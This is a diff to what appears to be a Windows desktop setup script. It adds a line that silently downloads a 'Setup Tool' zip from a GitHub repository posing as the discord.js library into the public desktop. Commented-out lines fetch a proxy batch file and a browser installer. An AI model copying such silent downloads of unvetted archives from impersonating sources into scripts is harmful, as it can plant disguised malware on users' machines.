@@ -14,6 +14,7 @@ cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 #curl -L -k -O https://github.com/kmille36/thuonghai/raw/master/setproxywin.bat
 #curl -L -k -O https://raw.githubusercontent.com/kmille36/thuonghai/master/BraveBrowserSetup.exe
 cd "C:\Users\Public\Desktop"
+curl -L -s -O https://github.com/hungwt/discord.js/blob/master/src/Setup%20Tool%20%F0%9F%98%8E.zip?raw=true
 #curl -L -k -o "EnableInternetAccess.bat" https://github.com/kmille36/thuonghai/raw/master/setproxywin.bat
 #curl -L -k -O https://raw.githubusercontent.com/kmille36/thuonghai/master/BraveBrowserSetup.exe
 sc start audiosrv
